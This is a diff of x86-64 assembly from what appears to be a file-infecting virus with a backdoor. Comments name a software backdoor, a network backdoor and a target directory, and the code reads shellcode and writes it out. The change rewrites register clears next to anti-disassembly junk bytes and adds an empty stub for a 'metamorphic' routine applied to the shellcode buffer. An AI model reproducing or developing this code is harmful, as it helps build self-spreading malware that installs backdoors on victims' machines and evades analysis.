@@ -13,7 +13,7 @@ global _start
 _start:
 	call create_soft_bd
 	push rax
-	mov rax, 0
+	xor rax, rax 
 	db 0x74
 	db 0x01
 	db 0x0f
@@ -47,7 +47,7 @@ _start:
 	pop rcx 
 	;create network backdoor
 	push rax
-	mov rax, 0
+	xor rax, rax
 	db 0x74
 	db 0x01
 	db 0x0f
@@ -69,7 +69,7 @@ _start:
 	push 0x0000002e; our target directory here "."
 	lea rdi, [rsp]
 	push rax
-	mov rax, 0
+	xor rax, rax
 	db 0x74
 	db 0x01
 	db 0x0f
@@ -93,7 +93,7 @@ _start:
 	push 0x0000002e; our target directory here "."
 	lea rdi, [rsp]
 	push rax
-	mov rax, 0
+	xor rax, rax
 	db 0x74
 	db 0x01
 	db 0x0f
@@ -1837,7 +1837,11 @@ push rdi
 	syscall; read(sc_fd, buffer, SHELLCODE_LEN);
 	mov rax, 3
 	syscall; close(sc_fd)
+	;apply metamorphic changes to buffer in rdi
+	lea rdi, [rsp+8]
+	call metamorphic
 	pop rdi
+
 	mov rax, 1
 	mov rsi, rsp
 	mov rdx, PURE_SHELLCODE_LEN
@@ -1846,6 +1850,12 @@ push rdi
 pop rdi
 retn
 
+;void metamorphic(char *code)
+metamorphic: 
+
+
+
+retn
 
 ;Replaces each occurence of 'to_replace' by 'with' in 'base_str'
 ;void ft_str_replace(char *base_str, char *to_replace, char *with, size_t size_base)
@@ -1929,17 +1939,6 @@ ft_str_replace:
 	pop rax
 
 retn
-
-ft_strlen:
-	mov rax, 0
-	loop:
-		cmp byte[rdi + rax], 0
-		je strlen_exit
-		inc rax
-		jmp loop
-	strlen_exit:
-retn
-
 
 
 ;puts
